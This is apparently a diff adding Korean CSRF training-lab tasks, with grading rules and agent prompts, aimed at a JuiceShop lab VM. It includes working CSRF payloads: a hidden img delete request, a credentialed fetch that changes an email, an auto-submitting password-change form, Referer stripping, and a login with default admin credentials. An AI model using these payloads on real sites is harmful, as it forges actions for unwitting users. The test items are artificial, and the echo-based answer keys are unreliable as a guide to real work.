+  verify:
+    type: output_contains
+    expect: GET CSRF PoC 작성 완료
+    field: stdout
+    semantic:
+      intent: GET 기반 CSRF — img src 에 상태 변경 URL 넣어 이미지 로드만으로 요청 발생
+      success_criteria:
+      - img src 에 GET 변경 URL (예 /transfer?to=atk&amp;amt=1000) 포함
+      - 피해자 페이지 방문만으로 요청 발생 메커니즘 설명
+      - GET 에 상태 변경을 두면 안되는 원칙 언급
+      acceptable_methods:
+      - img src <target url>
+      - link rel prefetch
+      - iframe src
+      - CSS background-image url
+      negative_signs:
+      - POST 로 오해
+      - CSRF 원리 설명 없음
+      - RESTful 원칙 언급 없음
+  target_vm: attacker
+  script: echo '<img src="http://10.20.30.80/api/users/1/delete" style="display:none">'
+    && echo 'GET CSRF PoC 작성 완료'
+  risk_level: low
+  bastion_prompt: '이미지 태그를 이용한 GET 기반 CSRF를 구성해줘
+
+
+    [도구 권장] csrf_craft: curl + cookie jar (-b -c), HTML form 작성. curl 만 쓰지 말고 **curl
+    + cookie jar (-b -c)** 등 적합 도구로 호출 후 stdout quote.'
+- order: 4
+  instruction: 'AJAX 기반 CSRF를 작성하시오: fetch API 활용.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_craft` 에 적합한 도구: curl + cookie jar (-b -c),
+    HTML form 작성. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 'fetch로 credentials: include 옵션을 사용하세요.'
+  category: csrf_craft
+  points: 10
+  answer: '🤖 프롬프트: AJAX 기반 CSRF를 작성하시오: fetch API 활용 구현 방법과 예시를 설명해줘
+
+    📎 참고 (CLI): echo ''fetch(URL,{method:"POST",credentials:"include",body:JSON.stringify({email:"evil@test.com"})})''
+    && echo ''AJAX CSRF 작성 완료'''
+  answer_detail: 'credentials: include로 쿠키가 자동 첨부되어 인증된 요청을 위조합니다.'
+  verify:
+    type: output_contains
+    expect: AJAX CSRF 작성 완료
+    field: stdout
+    semantic:
+      intent: AJAX 기반 CSRF — fetch 또는 XMLHttpRequest 로 credentials include 요청해 세션
+        쿠키 사용
+      success_criteria:
+      - fetch(<url>, {method:POST, credentials:include}) 형태
+      - CORS Preflight 발생 여부 분석
+      - simple request 와 preflight 요청의 구분 설명
+      acceptable_methods:
+      - fetch credentials:include
+      - XMLHttpRequest withCredentials=true
+      - axios withCredentials 설정
+      - JSONP 악용 (구형)
+      negative_signs:
+      - credentials 설정 누락
+      - CORS preflight 언급 없음
+      - JSON 엔드포인트에 단순 POST 만
+  target_vm: attacker
+  script: echo 'fetch(URL,{method:"POST",credentials:"include",body:JSON.stringify({email:"evil@test.com"})})'
+    && echo 'AJAX CSRF 작성 완료'
+  risk_level: low
+  bastion_prompt: 'AJAX 기반 CSRF를 작성하시오: fetch API 활용.
+
+
+    [도구 권장] csrf_craft: curl + cookie jar (-b -c), HTML form 작성. curl 만 쓰지 말고 **curl
+    + cookie jar (-b -c)** 등 적합 도구로 호출 후 stdout quote.'
+- order: 5
+  instruction: 'SameSite 쿠키 속성의 CSRF 방어 효과를 분석하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_defense` 에 적합한 도구: SameSite/CSRF 토큰 검증.
+    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: Set-Cookie 헤더에서 SameSite를 확인하세요.
+  category: csrf_defense
+  points: 10
+  answer: '🤖 프롬프트: SameSite 쿠키 속성의 CSRF 방어 효과를 분석해줘
+
+    📎 참고 (CLI): curl -sI http://10.20.30.80 | grep -i ''set-cookie'' && echo ''SameSite
+    분석 완료'''
+  answer_detail: SameSite=Strict는 모든 크로스사이트 요청에서 쿠키 전송을 차단합니다.
+  verify:
+    type: output_contains
+    expect: SameSite 분석 완료
+    field: stdout
+    semantic:
+      intent: SameSite 쿠키 CSRF 방어 — Strict/Lax/None 차이와 현대 브라우저 Lax 기본값 영향
+      success_criteria:
+      - SameSite Strict/Lax/None 3단계 차이 설명
+      - Lax 의 top-level GET 예외 언급
+      - Chrome 2020 이후 Lax 기본값이 CSRF 대부분 차단함 언급
+      acceptable_methods:
+      - Set-Cookie 헤더 옵션 확인
+      - OWASP Session Management
+      - Chrome Cookie Policy 문서
+      - SameSite Cookies by Scott Helme
+      negative_signs:
+      - 3단계 중 일부만 설명
+      - 기본값 변경 언급 없음
+      - None Secure 필수성 누락
+  target_vm: attacker
+  script: curl -sI http://10.20.30.80 | grep -i 'set-cookie' && echo 'SameSite 분석
+    완료'
+  risk_level: low
+  bastion_prompt: 'SameSite 쿠키 속성의 CSRF 방어 효과를 분석해줘
+
+
+    [도구 권장] csrf_defense: SameSite/CSRF 토큰 검증. curl 만 쓰지 말고 **SameSite/CSRF 토큰 검증**
+    등 적합 도구로 호출 후 stdout quote.'
+- order: 6
+  instruction: 'CSRF 토큰 검증 로직의 약점을 분석하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_bypass` 에 적합한 도구: curl 로 토큰 누락/재사용 시도. 도구
+    호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 토큰 재사용, 빈 토큰 등을 테스트하세요.
+  category: csrf_bypass
+  points: 12
+  answer: '🤖 프롬프트: CSRF 토큰 검증 로직의 약점을 분석해줘
+
+    📎 참고 (CLI): echo ''=== CSRF 토큰 약점 ==='' && echo ''1. 토큰 미검증'' && echo ''2. 빈 토큰
+    허용'' && echo ''3. 토큰 재사용'' && echo ''CSRF 토큰 분석 완료'''
+  answer_detail: CSRF 토큰 구현 오류로 방어가 무효화될 수 있습니다.
+  verify:
+    type: output_contains
+    expect: CSRF 토큰 분석 완료
+    field: stdout
+    semantic:
+      intent: CSRF 토큰 검증 약점 — 토큰 비교 누락, 빈 토큰 허용, GET 메서드 예외, 전역 토큰 재사용 등 결함
+      success_criteria:
+      - 최소 3가지 구현 결함 열거(비교 누락, 빈 문자열 허용, 세션 무관 토큰)
+      - Burp Repeater 로 토큰 삭제/수정 후 요청 시도
+      - 방어 (HMAC 기반 토큰, 세션 바인딩) 언급
+      acceptable_methods:
+      - Burp Repeater 로 토큰 필드 제거
+      - python requests 로 토큰 조작 테스트
+      - OWASP CSRF Prevention 가이드 참조
+      - OWASP ZAP CSRF active scan
+      negative_signs:
+      - 약점 1가지만
+      - 실제 테스트 없이 개념만
+      - 방어 방안 없음
+  target_vm: attacker
+  script: echo '=== CSRF 토큰 약점 ===' && echo '1. 토큰 미검증' && echo '2. 빈 토큰 허용' && echo
+    '3. 토큰 재사용' && echo 'CSRF 토큰 분석 완료'
+  risk_level: low
+  bastion_prompt: 'CSRF 토큰 검증 로직의 약점을 분석해줘
+
+
+    [도구 권장] csrf_bypass: curl 로 토큰 누락/재사용 시도. curl 만 쓰지 말고 **curl 로 토큰 누락/재사용 시도**
+    등 적합 도구로 호출 후 stdout quote.'
+- order: 7
+  instruction: 'Referer 헤더 기반 CSRF 방어를 우회하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_bypass` 에 적합한 도구: curl 로 토큰 누락/재사용 시도. 도구
+    호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: Referer를 제거하는 기법을 사용하세요.
+  category: csrf_bypass
+  points: 10
+  answer: '🤖 프롬프트: Referer 헤더 기반 CSRF 방어를 우회해줘
+
+    📎 참고 (CLI): echo ''<meta name="referrer" content="no-referrer">'' && echo ''Referer
+    우회 기법 완료'''
+  answer_detail: meta 태그로 Referer 전송을 방지하면 서버의 Referer 검증을 우회할 수 있습니다.
+  verify:
+    type: output_contains
+    expect:
+    - Referer 우회 기법 완료
+    - curl
+    field: stdout
+    semantic:
+      intent: Referer 기반 방어 우회 — Referer 헤더 삭제, data URL 사용, subdomain 스푸핑으로 우회
+      success_criteria:
+      - Referer-Policy no-referrer 적용해 헤더 제거 기법
+      - data URL 또는 HTTPS to HTTP 전환으로 Referer 미전송
+      - Referer-only 방어의 근본 한계 설명
+      acceptable_methods:
+      - meta referrer=no-referrer 또는 Referrer-Policy
+      - rel=noreferrer 링크 속성
+      - Subdomain takeover 로 Referer 위조
+      - curl -e  로 Referer 없는 요청
+      negative_signs:
+      - 헤더 조작 시도 없음
+      - 단일 우회 기법만
+      - 방어 한계 분석 없음
+  target_vm: attacker
+  script: echo '<meta name="referrer" content="no-referrer">' && echo 'Referer 우회
+    기법 완료'
+  risk_level: low
+  bastion_prompt: 'Referer 헤더 기반 CSRF 방어를 우회해줘
+
+
+    [도구 권장] csrf_bypass: curl 로 토큰 누락/재사용 시도. curl 만 쓰지 말고 **curl 로 토큰 누락/재사용 시도**
+    등 적합 도구로 호출 후 stdout quote.'
+- order: 8
+  instruction: 'JSON 기반 엔드포인트의 CSRF 가능성을 분석하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_advanced` 에 적합한 도구: Burp 매크로 또는 curl + jq.
+    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: Content-Type 제한을 확인하세요.
+  category: csrf_advanced
+  points: 10
+  answer: "\U0001F916 프롬프트: JSON 기반 엔드포인트의 CSRF 가능성을 분석해줘\n\U0001F4CE 참고 (CLI): curl\
+    \ -s -X POST http://10.20.30.80/api/test \\\n  -H 'Content-Type: text/plain' \\\
+    \n  -d '{\"test\":1}' 2>/dev/null && echo 'JSON CSRF 분석 완료'"
+  answer_detail: 서버가 Content-Type을 검증하지 않으면 text/plain으로 JSON 데이터를 전송할 수 있습니다.
+  verify:
+    type: output_contains
+    expect: JSON CSRF 분석 완료
+    field: stdout
+    semantic:
+      intent: JSON 엔드포인트 CSRF — Content-Type application/json 요구로 simple request 불가능,
+        그러나 Flash/특정 우회 가능
+      success_criteria:
+      - JSON POST 는 simple request 아니므로 preflight 발생함 설명
+      - Content-Type text/plain 우회 또는 XHR boundary 조작 공격 벡터
+      - CSRF 토큰이 여전히 필요한 이유 언급
+      acceptable_methods:
+      - curl -H Content-Type:application/json -d {...}
+      - Flash XHR (구형) 또는 form trickery
+      - fetch 로 Content-Type 조작
+      - CORS misconfigured allow any origin 와 결합
+      negative_signs:
+      - simple vs preflight 구분 없음
+      - JSON 만으로 CSRF 완전 차단된다고 오판
+      - CORS 연계 없음
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.30.80/api/test \\\n  -H 'Content-Type: text/plain'\
+    \ \\\n  -d '{\"test\":1}' 2>/dev/null && echo 'JSON CSRF 분석 완료'"
+  risk_level: low
+  bastion_prompt: 'JSON 기반 엔드포인트의 CSRF 가능성을 분석해줘
+
+
+    [도구 권장] csrf_advanced: Burp 매크로 또는 curl + jq. curl 만 쓰지 말고 **Burp 매크로 또는 curl
+    + jq** 등 적합 도구로 호출 후 stdout quote.'
+- order: 9
+  instruction: 'CORS 설정과 CSRF의 관계를 분석하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_advanced` 에 적합한 도구: Burp 매크로 또는 curl + jq.
+    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: Access-Control 헤더를 확인하세요.
+  category: csrf_advanced
+  points: 10
+  answer: "\U0001F916 프롬프트: CORS 설정과 CSRF의 관계를 분석해줘\n\U0001F4CE 참고 (CLI): curl -sI\
+    \ \\\n  -H 'Origin: http://evil.com' http://10.20.30.80 \\\n | grep -i 'access-control'\
+    \ && echo 'CORS 분석 완료' || echo 'CORS 미설정 확인 완료'"
+  answer_detail: CORS 와일드카드(*)는 credentials와 함께 사용 불가하지만 특정 Origin 반사는 위험합니다.
+  verify:
+    type: output_contains
+    expect:
+    - 완료
+    - Access
+    - Control
+    field: stdout
+    semantic:
+      intent: CORS 설정과 CSRF 관계 — Access-Control-Allow-Credentials true + Allow-Origin
+        wildcard/reflection 시 CSRF 심화
+      success_criteria:
+      - preflight 없는 simple request 와 preflight 요구 차이
+      - ACAO wildcard + credentials 불가 원칙
+      - 반사형 Origin 정책 취약점 및 subdomain takeover 연계
+      acceptable_methods:
+      - curl -H Origin:https://evil.com <url>
+      - corsy 자동 스캐너
+      - Burp CORS * scanner
+      - Mozilla CORS 문서
+      negative_signs:
+      - CORS 만 언급하고 CSRF 연결 없음
+      - credentials 규칙 설명 없음
+      - Origin 반사 위험 누락
+  target_vm: attacker
+  script: "curl -sI \\\n  -H 'Origin: http://evil.com' http://10.20.30.80 \\\n | grep\
+    \ -i 'access-control' && echo 'CORS 분석 완료' || echo 'CORS 미설정 확인 완료'"
+  risk_level: low
+  bastion_prompt: 'CORS 설정과 CSRF의 관계를 분석해줘
+
+
+    [도구 권장] csrf_advanced: Burp 매크로 또는 curl + jq. curl 만 쓰지 말고 **Burp 매크로 또는 curl
+    + jq** 등 적합 도구로 호출 후 stdout quote.'
+- order: 10
+  instruction: 'CSRF와 XSS 체인 공격을 설계하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_advanced` 에 적합한 도구: Burp 매크로 또는 curl + jq.
+    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: XSS로 CSRF 토큰을 탈취하는 시나리오를 구성하세요.
+  category: csrf_advanced
+  points: 10
+  answer: '🤖 프롬프트: CSRF와 XSS 체인 공격을 구현 방법을 설명하고 예시 코드를 보여줘
+
+    📎 참고 (CLI): echo ''=== XSS+CSRF 체인 ==='' && echo ''1. XSS로 CSRF 토큰 읽기'' && echo
+    ''2. 탈취 토큰으로 CSRF 요청'' && echo ''3. 방어 우회 성공'' && echo ''체인 공격 설계 완료'''
+  answer_detail: XSS가 존재하면 CSRF 토큰 방어가 무효화됩니다.
+  verify:
+    type: output_contains
+    expect: 체인 공격 설계 완료
+    field: stdout
+    semantic:
+      intent: CSRF + XSS 체인 — XSS 로 CSRF 토큰 조회 후 악성 요청 전송 (Same-Origin 정책 하에서 가능)
+      success_criteria:
+      - XSS 로 토큰 DOM 조회 JS 예시 (document.querySelector)
+      - 토큰을 포함한 fetch/XHR 로 상태 변경 요청
+      - XSS 가 있으면 CSRF 방어가 무력화됨 설명
+      acceptable_methods:
+      - document.querySelector to read token
+      - fetch with token in headers
+      - BeEF 모듈 exploit chain
+      - XSSHunter + custom payload
+      negative_signs:
+      - XSS 없이 CSRF 만
+      - 토큰 조회 메커니즘 누락
+      - 체인 공격 흐름 설명 없음
+  target_vm: attacker
+  script: echo '=== XSS+CSRF 체인 ===' && echo '1. XSS로 CSRF 토큰 읽기' && echo '2. 탈취 토큰으로
+    CSRF 요청' && echo '3. 방어 우회 성공' && echo '체인 공격 설계 완료'
+  risk_level: low
+  bastion_prompt: 'CSRF와 XSS 체인 공격을 설계하시오.
+
+
+    [도구 권장] csrf_advanced: Burp 매크로 또는 curl + jq. curl 만 쓰지 말고 **Burp 매크로 또는 curl
+    + jq** 등 적합 도구로 호출 후 stdout quote.'
+- order: 11
+  instruction: 'Double Submit Cookie 방어 기법을 분석하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_defense` 에 적합한 도구: SameSite/CSRF 토큰 검증.
+    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 쿠키와 요청 파라미터의 토큰 비교를 설명하세요.
+  category: csrf_defense
+  points: 10
+  answer: '🤖 프롬프트: Double Submit Cookie 방어 기법을 분석해줘
+
+    📎 참고 (CLI): echo ''=== Double Submit Cookie ==='' && echo ''1. 서버가 랜덤 토큰을 쿠키로
+    설정'' && echo ''2. 클라이언트가 헤더에 복사'' && echo ''3. 서버가 일치 확인'' && echo ''Double Submit
+    분석 완료'''
+  answer_detail: 크로스사이트에서는 쿠키 값을 읽을 수 없으므로 헤더에 복사할 수 없습니다.
+  verify:
+    type: output_contains
+    expect: Double Submit 분석 완료
+    field: stdout
+    semantic:
+      intent: Double Submit Cookie — 쿠키 토큰과 헤더/폼 토큰 일치 검증, 서버 세션 저장 불필요한 Stateless
+        방식
+      success_criteria:
+      - 쿠키 토큰 + X-CSRF-Token 헤더 동시 전송 구조 설명
+      - HttpOnly 쿠키면 JS 가 읽을 수 없어 공격자 토큰 생성 불가 원리
+      - 한계(subdomain 쿠키 변조 위험) 언급
+      acceptable_methods:
+      - OWASP Double Submit Cookie 가이드
+      - Django/Rails 구현 예시
+      - Cloudflare __cf_bm 유사 구조
+      - Signed Double Submit 변형
+      negative_signs:
+      - Synchronizer Token 과 혼동
+      - HttpOnly 역할 설명 없음
+      - Stateless 이점 누락
+  target_vm: attacker
+  script: echo '=== Double Submit Cookie ===' && echo '1. 서버가 랜덤 토큰을 쿠키로 설정' && echo
+    '2. 클라이언트가 헤더에 복사' && echo '3. 서버가 일치 확인' && echo 'Double Submit 분석 완료'
+  risk_level: low
+  bastion_prompt: 'Double Submit Cookie 방어 기법을 분석해줘
+
+
+    [도구 권장] csrf_defense: SameSite/CSRF 토큰 검증. curl 만 쓰지 말고 **SameSite/CSRF 토큰 검증**
+    등 적합 도구로 호출 후 stdout quote.'
+- order: 12
+  instruction: '프레임워크별 CSRF 방어 기능을 비교하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_defense` 에 적합한 도구: SameSite/CSRF 토큰 검증.
+    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: Django, Spring, Express 등의 CSRF 방어를 정리하세요.
+  category: csrf_defense
+  points: 10
+  answer: '🤖 프롬프트: 프레임워크별 CSRF 방어 기능을 비교해줘
+
+    📎 참고 (CLI): echo ''=== 프레임워크 CSRF 방어 ==='' && echo ''Django: csrf_token'' && echo
+    ''Spring: CsrfFilter'' && echo ''Express: csurf'' && echo ''프레임워크 비교 완료'''
+  answer_detail: 대부분의 현대 프레임워크는 CSRF 방어를 내장하고 있습니다.
+  verify:
+    type: output_contains
+    expect: 프레임워크 비교 완료
+    field: stdout
+    semantic:
+      intent: 프레임워크별 CSRF 방어 — Django csrf_token, Rails authenticity_token, Spring
+        CsrfFilter, Express csurf 비교
+      success_criteria:
+      - 3개 이상 프레임워크의 CSRF 방어 기능 이름과 활성화 방법
+      - 자동 vs 수동 토큰 삽입 차이
+      - 취약 설정(disable_csrf) 언급
+      acceptable_methods:
+      - 표 형식 프레임워크 비교
+      - 각 docs 링크 참조
+      - SAST 로 disable 코드 탐지
+      - 코드 레벨 예시
+      negative_signs:
+      - 단일 프레임워크만
+      - 활성화/비활성화 구분 없음
+      - 기본값 안전 여부 불명
+  target_vm: attacker
+  script: 'echo ''=== 프레임워크 CSRF 방어 ==='' && echo ''Django: csrf_token'' && echo ''Spring:
+    CsrfFilter'' && echo ''Express: csurf'' && echo ''프레임워크 비교 완료'''
+  risk_level: low
+  bastion_prompt: '프레임워크별 CSRF 방어 기능을 비교해줘
+
+
+    [도구 권장] csrf_defense: SameSite/CSRF 토큰 검증. curl 만 쓰지 말고 **SameSite/CSRF 토큰 검증**
+    등 적합 도구로 호출 후 stdout quote.'
+- order: 13
+  instruction: 'CSRF 취약점 자동 탐지 방법을 구현하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_tool` 에 적합한 도구: csrf-poc-generator, curl.
+    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 폼의 토큰 유무를 자동 확인하세요.
+  category: csrf_tool
+  points: 10
+  answer: '🤖 프롬프트: CSRF 취약점 자동 탐지 방법을 구현해줘
+
+    📎 참고 (CLI): echo ''자동 CSRF 탐지: 폼 분석 -> 토큰 검사 -> 결과'' && echo ''자동 탐지 완료'''
+  answer_detail: 자동화된 CSRF 토큰 검사로 누락된 방어를 식별합니다.
+  verify:
+    type: output_contains
+    expect: 자동 탐지 완료
+    field: stdout
+    semantic:
+      intent: CSRF 자동 탐지 — ZAP/Burp active scan, csrfprobe 등 도구로 폼·엔드포인트 자동 점검
+      success_criteria:
+      - 최소 1개 도구 실행 예시 (ZAP 또는 Burp)
+      - 탐지 로직(토큰 제거 후 요청 성공 여부) 설명
+      - False positive 방지 전략
+      acceptable_methods:
+      - OWASP ZAP CSRF scan rule
+      - Burp Suite Pro active scan
+      - csrfprobe 또는 xsrfprobe
+      - python 스크립트로 폼 자동 수집 후 토큰 제거 시도
+      negative_signs:
+      - 수동 탐지만 언급
+      - False positive 관점 없음
+      - 도구 실행 결과 해석 없음
+  target_vm: attacker
+  script: 'echo ''자동 CSRF 탐지: 폼 분석 -> 토큰 검사 -> 결과'' && echo ''자동 탐지 완료'''
+  risk_level: low
+  bastion_prompt: 'CSRF 취약점 자동 탐지 방법을 구현해줘
+
+
+    [도구 권장] csrf_tool: csrf-poc-generator, curl. curl 만 쓰지 말고 **csrf-poc-generator**
+    등 적합 도구로 호출 후 stdout quote.'
+- order: 14
+  instruction: 'CSRF 방어 권고사항을 종합 정리하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_defense` 에 적합한 도구: SameSite/CSRF 토큰 검증.
+    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 토큰, SameSite, Referer 검증 등을 포함하세요.
+  category: csrf_defense
+  points: 12
+  answer: '🤖 프롬프트: CSRF 방어 권고사항을 종합 정리해줘
+
+    📎 참고 (CLI): echo ''=== CSRF 방어 권고 ==='' && echo ''1. CSRF 토큰 적용'' && echo ''2.
+    SameSite=Strict'' && echo ''3. Referer 검증'' && echo ''4. CORS 제한'' && echo ''CSRF
+    방어 정리 완료'''
+  answer_detail: 다층 CSRF 방어가 필요합니다.
+  verify:
+    type: output_contains
+    expect: CSRF 방어 정리 완료
+    field: stdout
+    semantic:
+      intent: CSRF 방어 권고 종합 — SameSite Lax/Strict + CSRF 토큰 + Origin/Referer 검증 다층
+        방어
+      success_criteria:
+      - 최소 3개 방어 계층 (쿠키/토큰/Origin) 조합 제안
+      - 민감 작업 재인증(step-up auth) 포함
+      - 모니터링·이상 탐지 운영적 방어 언급
+      acceptable_methods:
+      - OWASP CSRF Prevention Cheat Sheet 룰 1-4
+      - NIST SP 800-63 재인증 지침
+      - CI/CD 스캔 통합
+      - WAF CSRF 룰
+      negative_signs:
+      - 단일 방어만
+      - 민감 작업 재인증 누락
+      - 모니터링 없음
+  target_vm: attacker
+  script: echo '=== CSRF 방어 권고 ===' && echo '1. CSRF 토큰 적용' && echo '2. SameSite=Strict'
+    && echo '3. Referer 검증' && echo '4. CORS 제한' && echo 'CSRF 방어 정리 완료'
+  risk_level: low
+  bastion_prompt: 'CSRF 방어 권고사항을 종합 정리해줘
+
+
+    [도구 권장] csrf_defense: SameSite/CSRF 토큰 검증. curl 만 쓰지 말고 **SameSite/CSRF 토큰 검증**
+    등 적합 도구로 호출 후 stdout quote.'
+- order: 15
+  instruction: 'CSRF 실습 종합 보고서를 작성하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `verification` 에 적합한 도구: curl/jq 로 PoC 재현 + 결과
+    비교. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 발견 취약점, PoC, 방어 권고를 포함하세요.
+  category: verification
+  points: 8
+  answer: '🤖 프롬프트: CSRF 실습 종합 보고서를 구현 방법을 설명하고 예시 코드를 보여줘
+
+    📎 참고 (CLI): echo ''=== CSRF 분석 보고서 ==='' && echo ''대상: http://10.20.30.80'' &&
+    echo ''발견: CSRF 토큰 미적용'' && echo ''영향: 설정/패스워드 변경'' && echo ''조치: 토큰 + SameSite''
+    && echo ''=== 보고서 완료 ==='''
+  answer_detail: CSRF 보고서는 PoC와 재현 절차를 반드시 포함해야 합니다.
+  verify:
+    type: output_contains
+    expect:
+    - 보고서 완료
+    - Proof
+    - Concept
+    - report
+    field: stdout
+    semantic:
+      intent: CSRF 실습 종합 보고서 — 탐지·Exploit·방어·자동화 결과를 /tmp/csrf_report.txt 로 정리
+      success_criteria:
+      - 4 섹션 이상 (폼/토큰/SameSite/CORS 연계)
+      - PoC HTML/URL 최소 1개 포함
+      - 파일 저장 후 cat 확인
+      acceptable_methods:
+      - heredoc markdown
+      - echo -e 다줄
+      - json/yaml 구조화
+      - python 템플릿
+      negative_signs:
+      - 섹션 2 미만
+      - PoC 없음
+      - 파일 저장 없음
+  target_vm: attacker
+  script: 'echo ''=== CSRF 분석 보고서 ==='' && echo ''대상: http://10.20.30.80'' && echo
+    ''발견: CSRF 토큰 미적용'' && echo ''영향: 설정/패스워드 변경'' && echo ''조치: 토큰 + SameSite'' &&
+    echo ''=== 보고서 완료 ==='''
+  risk_level: low
+  bastion_prompt: 'CSRF 실습 종합 보고서를 작성하시오.
+
+
+    [도구 권장] verification: curl/jq 로 PoC 재현 + 결과 비교. curl 만 쓰지 말고 **curl/jq 로 PoC 재현
+    + 결과 비교** 등 적합 도구로 호출 후 stdout quote.'
+- order: 99
+  instruction: '[복합 시나리오] "인증 방식 × CSRF 방어 매트릭스 — JWT/Session × SameSite/Token/CORS"
+
+
+    ■ 상황 (w03 → w04 시나리오 연속)
+
+
+    w03 에서 CSP 미설정 → XSS reflection 까지 봤다. 선배가 다음 단계.
+
+
+    ※ 선배: "이번 주는 인증·세션이야. JuiceShop 은 JWT 쓰는데, 어떤 사이트는 Cookie+Session 이지.
+
+    ※ 인증 방식이 다르면 CSRF 방어 전략도 달라져. JWT 는 Authorization 헤더라 CSRF 가 자동으론 안 박혀.
+
+    ※ Cookie 면 SameSite/CSRF token 이 필수고. 로그인 한 번 하고 토큰 분석한 다음, CSRF PoC 시도해 보고,
+
+    ※ 인증방식 × 방어수단 매트릭스 만들어. 그게 점검 보고서의 핵심이야."
+
+
+    학습 목표 (lecture #1 인증 + #3 세션 + #4 JWT) + (lab #1 토큰 + #5 SameSite + #6 토큰 약점)
+    통합.
+
+
+    ■ 임무 (3 단계, 약 35분)
+
+
+    ▶ Phase A — 로그인 후 인증 토큰 분석 (lecture #1·#4)
+
+    `curl -s -i -X POST -H "Content-Type: application/json"
+
+    -d ''{"email":"admin@juice-sh.op","password":"admin123"}'' http://10.20.30.80/rest/user/login`
+
+    실행. 응답에서 `authentication.token` (JWT) 추출. JWT 3-part (header.payload.signature)
+    구조 + base64
+
+    payload decode 로 alg / iat / exp 확인.
+
+
+    ▶ Phase B — CSRF PoC + SameSite 영향 (lab #1·#2·#5)
+
+    JuiceShop 은 JWT Authorization 헤더 방식이므로 *전형적 CSRF 가 안 박힘* — 그 이유 자체가 학습 포인트.
+
+    가상의 Cookie 기반 사이트 가정해, 패스워드 변경 위조 HTML 작성 (`<form action=... method=POST>` +
+
+    `<input name=newpw>` + auto submit script). SameSite=Strict 시 차단 / Lax 시 GET 만
+    차단 / None 시
+
+    무방어 — 3 케이스 매트릭스로 구분.
+
+
+    ▶ Phase C — 인증방식 × CSRF 방어 매트릭스 (lecture·lab 통합)
+
+    | 인증방식 | CSRF 자동발동 | 권장 방어 | 비고 |
+
+    | Session Cookie | 가능 | CSRF Token + SameSite=Lax | Double Submit |
+
+    | JWT in Cookie | 가능 | CSRF Token + SameSite=Strict | 비추천 |
+
+    | JWT in Header | 불가 | CORS + Origin 검증 | 권장 |
+
+    | OAuth2 PKCE | 부분 | state 파라미터 | code intercept 방어 |
+
+    표 끝에 "JuiceShop = JWT-Header → CORS·Origin 검증 권고" 한 줄.
+
+
+    종료: echo "=== Phase A JWT decode ===" / "=== Phase B SameSite 매트릭스 ===" / "===
+    Phase C 매트릭스 ===".
+
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `integration_scenario` 에 적합한 도구: 여러 도구 chain —
+    정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로
+    답변에 직접 quote** 해야 채점 통과.'
+  bastion_prompt: '[복합 시나리오 — w04 인증 × CSRF 매트릭스]
+
+
+    JuiceShop (http://10.20.30.80) 인증 토큰 분석 → CSRF PoC → 매트릭스 보고서 3 phase.
+
+
+    Phase A (JWT 분석):
+
+    `curl -s -i -X POST -H "Content-Type: application/json" -d ''{"email":"admin@juice-sh.op","password":"admin123"}''
+
+    http://10.20.30.80/rest/user/login` 실행. 응답 body 에서 JWT 추출.
+
+    `echo "<JWT>" | cut -d. -f2 | base64 -d 2>/dev/null` 로 payload decode. alg/iat/exp
+    출력.
+
+
+    Phase B (CSRF PoC + SameSite 비교):
+
+    JWT-Header 인증은 CSRF 자동발동 안 됨 (이 자체가 분석 결과). 가상 Cookie 사이트 가정해 패스워드 변경
+
+    위조 HTML PoC 출력 (`<form action="http://victim/change_pw" method=POST><input name=newpw
+    value=hacked>
+
+    <script>document.forms[0].submit()</script></form>`).
+
+    SameSite 3 케이스 영향:
+
+    - Strict: 모든 cross-site 요청 차단
+
+    - Lax: GET 허용, POST 차단
+
+    - None: 무방어
+
+
+    Phase C (매트릭스):
+
+    ```
+
+    | 인증방식 | CSRF 자동발동 | 권장 방어 | 비고 |
+
+    | Session Cookie | 가능 | CSRF Token + SameSite=Lax | Double Submit |
+
+    | JWT in Cookie | 가능 | CSRF Token + SameSite=Strict | 비추천 |
+
+    | JWT in Header | 불가 | CORS + Origin 검증 | 권장 |
+
+    | OAuth2 PKCE | 부분 | state 파라미터 | code intercept 방어 |
+
+    ```
+
+    표 끝에 "JuiceShop = JWT-Header → CORS·Origin 검증 권고" 한 줄.
+
+
+    종료: echo "=== Phase A JWT decode ===" / "=== Phase B SameSite 매트릭스 ===" / "===
+    Phase C 매트릭스 ===" 묶음.
+
+
